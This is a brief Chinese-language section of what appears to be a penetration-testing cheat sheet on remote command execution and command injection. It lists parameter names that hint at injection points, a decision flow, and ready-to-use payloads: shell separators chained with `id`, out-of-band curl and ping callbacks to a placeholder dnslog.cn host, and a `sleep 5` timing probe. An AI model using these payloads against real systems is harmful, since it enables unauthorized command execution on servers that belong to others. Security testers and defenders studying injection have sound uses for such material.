# §11 RCE/命令注入
### 识别信号
- `cmd command exec shell ping host ip domain`
### 决策流程
```
注入分隔符 ; | & && ` $() → 有回显/DNSLOG=RCE ✅
```
### Payload
```
分隔符: ; id | id || id & id && id `id` $(id)
DNSLOG: ; curl xxxx.dnslog.cn  ; ping -c 1 xxxx.dnslog.cn
延时: ; sleep 5
```
